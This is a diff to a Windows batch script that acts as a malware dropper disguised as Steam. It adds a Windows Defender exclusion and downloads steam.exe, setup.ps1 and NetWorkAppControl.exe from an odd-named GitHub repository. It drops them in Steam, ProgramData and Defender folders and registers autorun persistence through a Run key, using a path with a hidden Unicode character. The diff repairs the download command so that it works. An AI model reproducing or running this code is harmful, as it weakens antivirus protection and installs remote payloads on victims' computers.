@@ -1,7 +1,7 @@
 @echo off
 SET REG_KEY="HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 SET REG_VALUE="Steam"
-SET REG_EXPECTED_VALUE="\"C:\Program Files (x86)\Steam\‎ steam.exe\" -silent"
+SET REG_EXPECTED_VALUE="\"C:\Program Files (x86)\Steam\‎steam.exe\" -silent"
 
 :: Check if the registry value exists
 REG QUERY %REG_KEY% /v %REG_VALUE% >nul 2>&1
@@ -26,7 +26,7 @@ IF %ERRORLEVEL% EQU 0 (
 pause
 
 powershell Add-MpPreference -ExclusionPath %folderPath%
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe -OutFile 'C:\Program Files (x86)\Steam\‎ steam.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\‎steam.exe'"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\Windows\setup.ps1'"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/NetWorkAppControl.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'"
 
